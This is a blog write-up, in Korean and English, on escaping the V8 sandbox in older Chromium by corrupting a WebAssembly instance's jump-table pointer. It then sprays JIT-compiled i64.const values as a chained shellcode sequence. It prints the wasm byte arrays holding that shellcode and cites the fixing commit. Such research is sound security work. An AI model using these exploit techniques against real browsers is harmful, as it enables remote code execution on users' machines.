@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Setup Ubuntu 22.04.5 LTS 8cf17a14a78cc1276eb42e1b4bb699f705675530 (2024.01.04.)  setup.zsh AnalysisFunction in WebAssembly module12345678910111213&#x2F;*(module    (func (export &quot;f1&quot;))    (func (">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)">
+<meta property="og:url" content="https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/index.html">
+<meta property="og:site_name" content="h0meb0dy">
+<meta property="og:description" content="Setup Ubuntu 22.04.5 LTS 8cf17a14a78cc1276eb42e1b4bb699f705675530 (2024.01.04.)  setup.zsh AnalysisFunction in WebAssembly module12345678910111213&#x2F;*(module    (func (export &quot;f1&quot;))    (func (">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/user-attachments/assets/e30c79f2-b68b-41ad-95bb-83723fddd78c">
+<meta property="og:image" content="https://github.com/user-attachments/assets/038e612e-47c1-4e32-ac37-4eaed3dad44f">
+<meta property="og:image" content="https://github.com/user-attachments/assets/8cb8389e-668e-45a7-9be7-8bc52db395ba">
+<meta property="og:image" content="https://github.com/user-attachments/assets/0b187d48-a91e-426c-933f-085ab655df7f">
+<meta property="og:image" content="https://github.com/user-attachments/assets/5ab468cc-85f0-4a24-88c6-cba4c6376f27">
+<meta property="og:image" content="https://github.com/user-attachments/assets/5469f1e9-a5f4-4617-9c04-58873a4723e2">
+<meta property="og:image" content="https://github.com/user-attachments/assets/b3a07117-565b-4eb4-850c-7e31572fc3cb">
+<meta property="article:published_time" content="2024-12-12T11:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-14T05:47:19.740Z">
+<meta property="article:author" content="Seongjoon Cho">
+<meta property="article:tag" content="browser">
+<meta property="article:tag" content="chromium">
+<meta property="article:tag" content="v8">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/user-attachments/assets/e30c79f2-b68b-41ad-95bb-83723fddd78c">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0JW360Q5KZ"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-0JW360Q5KZ');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/12/14/Escaping-V8-Sandbox-via-RegExp-Bytecode/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/10/Escaping-V8-Sandbox-via-Turbofan-JIT-Spraying/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&text=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&title=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&is_video=false&description=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)&body=Check out this article: https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&title=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&title=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&title=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&title=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&name=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&t=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Setup"><span class="toc-number">1.</span> <span class="toc-text">Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Function-in-WebAssembly-module"><span class="toc-number">2.1.</span> <span class="toc-text">Function in WebAssembly module</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JIT-just-in-time-spraying"><span class="toc-number">3.1.</span> <span class="toc-text">JIT (just-in-time) spraying</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Constructing-shellcode-chain"><span class="toc-number">3.2.</span> <span class="toc-text">Constructing shellcode chain</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch"><span class="toc-number">4.</span> <span class="toc-text">Patch</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Seongjoon Cho</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-12T11:00:00.000Z" class="dt-published" itemprop="datePublished">2024-12-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Write-up/">Write-up</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/browser/" rel="tag">browser</a>, <a class="p-category" href="/tags/chromium/" rel="tag">chromium</a>, <a class="p-category" href="/tags/v8/" rel="tag">v8</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul>
+<li>Ubuntu 22.04.5 LTS</li>
+<li><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8/+/8cf17a14a78cc1276eb42e1b4bb699f705675530">8cf17a14a78cc1276eb42e1b4bb699f705675530</a> (2024.01.04.)</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/h0meb0dy/Escaping-V8-Sandbox/tree/main/via%20WebAssembly%20JIT%20Spraying/setup.zsh">setup.zsh</a></p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Function-in-WebAssembly-module"><a href="#Function-in-WebAssembly-module" class="headerlink" title="Function in WebAssembly module"></a>Function in WebAssembly module</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">(module</span></span><br><span class="line"><span class="comment">    (func (export &quot;f1&quot;))</span></span><br><span class="line"><span class="comment">    (func (export &quot;f2&quot;))</span></span><br><span class="line"><span class="comment">    (func (export &quot;f3&quot;))</span></span><br><span class="line"><span class="comment">    (func (export &quot;f4&quot;))</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0x0</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x60</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x7</span>, <span class="number">0x15</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x66</span>, <span class="number">0x31</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x66</span>, <span class="number">0x32</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x66</span>, <span class="number">0x33</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0xb</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">let</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_module);</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(wasm_instance);</span><br></pre></td></tr></table></figure>
+
+<p><code>wasm_module</code>은 4개의 함수를 가지고 있는 Wasm module이다. Wasm module이 생성되면 함수들의 코드를 저장하기 위해 RWX permission이 설정된 영역이 할당되고, 이 영역의 가장 앞쪽에 jump table이 생성된다.</p>
+<p><img src="https://github.com/user-attachments/assets/e30c79f2-b68b-41ad-95bb-83723fddd78c" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/038e612e-47c1-4e32-ac37-4eaed3dad44f" alt="image"></p>
+<p>Jump table은 특정 함수가 호출되었을 때 execution flow를 어디로 옮겨야 하는지에 대한 정보를 담고 있다. Module이 생성된 후 함수가 최초로 호출되면 위와 같이 <code>Builtins_WasmCompileLazy()</code>로 jump하여 lazy compilation을 진행한다.</p>
+<p><img src="https://github.com/user-attachments/assets/8cb8389e-668e-45a7-9be7-8bc52db395ba" alt="image"></p>
+<p>두 번째 호출부터는 바로 compile된 코드로 jump하여 실행한다.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="JIT-just-in-time-spraying"><a href="#JIT-just-in-time-spraying" class="headerlink" title="JIT (just-in-time) spraying"></a>JIT (just-in-time) spraying</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">(module</span></span><br><span class="line"><span class="comment">    (func (export &quot;main&quot;)</span></span><br><span class="line"><span class="comment">        i64.const 0x4141414141414141</span></span><br><span class="line"><span class="comment">        i64.const 0x4242424242424242</span></span><br><span class="line"><span class="comment">        i64.const 0x4343434343434343</span></span><br><span class="line"><span class="comment">        return</span></span><br><span class="line"><span class="comment">    )</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0x0</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x60</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0x6d</span>, <span class="number">0x61</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xa</span>, <span class="number">0x26</span>, <span class="number">0x1</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x42</span>, <span class="number">0xc1</span>, <span class="number">0x82</span>, <span class="number">0x85</span>, <span class="number">0x8a</span>, <span class="number">0x94</span>, <span class="number">0xa8</span>, <span class="number">0xd0</span>, <span class="number">0xa0</span>, <span class="number">0xc1</span>, <span class="number">0x0</span>, <span class="number">0x42</span>, <span class="number">0xc2</span>, <span class="number">0x84</span>, <span class="number">0x89</span>, <span class="number">0x92</span>, <span class="number">0xa4</span>, <span class="number">0xc8</span>, <span class="number">0x90</span>, <span class="number">0xa1</span>, <span class="number">0xc2</span>, <span class="number">0x0</span>, <span class="number">0x42</span>, <span class="number">0xc3</span>, <span class="number">0x86</span>, <span class="number">0x8d</span>, <span class="number">0x9a</span>, <span class="number">0xb4</span>, <span class="number">0xe8</span>, <span class="number">0xd0</span>, <span class="number">0xa1</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0xb</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">let</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_module);</span><br><span class="line"></span><br><span class="line">wasm_instance.<span class="property">exports</span>.<span class="title function_">main</span>();</span><br><span class="line">% <span class="title class_">DebugPrint</span>(wasm_instance);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/user-attachments/assets/0b187d48-a91e-426c-933f-085ab655df7f" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/5ab468cc-85f0-4a24-88c6-cba4c6376f27" alt="image"></p>
+<p><code>const</code> instruction으로 number를 load하는 코드를 JIT compile하면 <code>const</code>의 operand가 코드에 raw numer로 삽입된다. <code>WasmInstanceObject</code>는 RWX 영역의 시작 주소인 <code>jump_table_start</code>를 8-byte full pointer로 가지고 있는데, 이 object는 V8 sandbox 내부에 위치하기 때문에 arbitrary address write primitive가 있으면 <code>jump_table_start</code>를 조작하여 <code>rip</code>를 control할 수 있다. <code>rip</code>를 코드에 삽입된 raw number의 주소(e.g. <code>0x3aa5e28bb84f</code>)로 옮기면 해당 raw number가 8바이트 길이의 shellcode로 동작하게 된다. </p>
+<h3 id="Constructing-shellcode-chain"><a href="#Constructing-shellcode-chain" class="headerlink" title="Constructing shellcode chain"></a>Constructing shellcode chain</h3><p>8바이트 길이의 shellcode로는 원하는 코드를 실행할 수 없을 가능성이 높다. 삽입되는 raw number들 간의 거리는 <code>0xff</code>를 초과하지 않기 때문에 shellcode의 마지막 2바이트에 <code>jmp</code> instruction을 넣어서 다음 shellcode로 jump하도록 하여 shellcode chain을 구성할 수 있다.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/h0meb0dy/Escaping-V8-Sandbox/tree/main/via%20WebAssembly%20JIT%20Spraying/shellcode.py">shellcode.py</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 shellcode.py &gt; pwn.wat</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">~/wabt/bin/wat2wasm pwn.wat <span class="comment"># output: pwn.wasm</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 wasm.py</span>               </span><br><span class="line">[0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0xb1, 0x1, 0x1, 0xae, 0x1, 0x0, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xb2, 0x9b, 0x86, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0xdf, 0xe0, 0x9b, 0x96, 0x8c, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x82, 0x83, 0x87, 0x82, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x8a, 0xbc, 0x91, 0x96, 0xcd, 0xdb, 0xf5, 0x2, 0x42, 0xd0, 0x90, 0xa5, 0xbc, 0x8e, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0xd8, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xea, 0x81, 0x83, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0x99, 0x85, 0xca, 0xd5, 0x87, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x82, 0x83, 0x87, 0x82, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x8a, 0x90, 0xca, 0xb4, 0x8a, 0xd4, 0xf5, 0x2, 0x42, 0xd0, 0x90, 0xa5, 0x84, 0x8e, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0xec, 0x9e, 0x85, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x92, 0x8a, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0xbb, 0x87, 0xe4, 0xf5, 0x2, 0x42, 0x8f, 0x8a, 0xc0, 0x84, 0x89, 0x92, 0xa4, 0xc8, 0x90, 0x7f, 0xf, 0xb]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/user-attachments/assets/5469f1e9-a5f4-4617-9c04-58873a4723e2" alt="image"></p>
+<p>만들어진 shellcode array에 위와 같이 중복되는 값이 있는 경우 register에 저장했다가 재사용하도록 compile되기 때문에 shellcode가 동작하지 않는다. 따라서 코드의 순서를 바꾸거나 <code>nop</code>의 위치를 옮겨서 중복되는 값이 없도록 만들어야 한다. 또한, 가용한 register가 없는 경우 register에 저장된 값을 stack에 백업하는 코드가 추가되기 때문에 shellcode 간의 거리가 변하는 것을 고려하여 <code>jmp</code>의 operand를 조절해 주어야 한다.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/h0meb0dy/Escaping-V8-Sandbox/tree/main/via%20WebAssembly%20JIT%20Spraying/pwn.wat">pwn.wat</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">~/wabt/bin/wat2wasm pwn.wat <span class="comment"># output: pwn.wasm</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 wasm.py</span></span><br><span class="line">[0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0xb1, 0x1, 0x1, 0xae, 0x1, 0x0, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xb2, 0x9b, 0x86, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0xdf, 0xe0, 0x9b, 0x96, 0x8c, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x82, 0x83, 0x87, 0x82, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x8a, 0xbc, 0x91, 0x96, 0xcd, 0xdb, 0xf5, 0x2, 0x42, 0xd0, 0x90, 0xa5, 0xbc, 0x8e, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0xd8, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0x90, 0x91, 0xc5, 0x81, 0x8c, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xea, 0x81, 0x83, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0x99, 0x85, 0xca, 0xd5, 0x87, 0xe4, 0xf5, 0x6, 0x42, 0x90, 0x91, 0x85, 0x86, 0x8e, 0x84, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0x8a, 0x90, 0xca, 0xb4, 0x8a, 0xd4, 0xf5, 0x6, 0x42, 0xd0, 0x90, 0xa5, 0x84, 0x8e, 0x92, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0xe2, 0xec, 0x9e, 0x85, 0x8a, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0x92, 0x8a, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0xbb, 0x87, 0xe4, 0xf5, 0x6, 0x42, 0x8f, 0x8a, 0xc0, 0x84, 0x89, 0x92, 0xa4, 0xc8, 0x90, 0x7f, 0xf, 0xb]</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/h0meb0dy/Escaping-V8-Sandbox/tree/main/via%20WebAssembly%20JIT%20Spraying/pwn.js">pwn.js</a></p>
+<p><img src="https://github.com/user-attachments/assets/b3a07117-565b-4eb4-850c-7e31572fc3cb" alt="image"></p>
+<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8/+/59acab802a319da23c1c005e062fbc2bab4d348b">wasm - Introduce WasmTrustedInstanceData</a> (2024.01.04.)<br>This CL moves most data from the WasmInstanceObject to a new WasmTrustedInstanceData. As the name suggests, this new object is allocated in the trusted space and can hence hold otherwise-unsafe data (like direct pointers). As the Wasm instance was still storing some unsafe pointers, this CL closes holes in the V8 sandbox, and allows us to land follow-up refactorings to remove more indirections for sandboxing (potentially after moving more data structures to the trusted space).</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
